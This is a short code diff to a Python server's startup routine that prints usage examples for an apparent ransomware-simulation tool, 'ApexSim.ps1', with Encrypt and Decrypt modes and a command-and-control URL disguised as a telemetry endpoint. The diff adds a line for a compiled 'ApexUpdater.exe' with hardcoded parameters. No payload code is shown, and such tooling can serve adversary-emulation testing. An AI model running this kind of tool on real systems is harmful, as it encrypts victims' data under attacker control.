@@ -39,6 +39,7 @@ async def startup():
     print("-" * 65)
     print("USAGE EXAMPLES:")
     print("  Encrypt: .\\ApexSim.ps1 -Mode Encrypt -C2Url 'https://YOUR_IP/api/v1/telemetry'")
+    print("  Compiled:.\\ApexUpdater.exe (Hardcoded params)")
     print("  Decrypt: .\\ApexSim.ps1 -Mode Decrypt -TargetPath 'C:\\SimulationData'")
     print("-" * 65)
     await init_db()
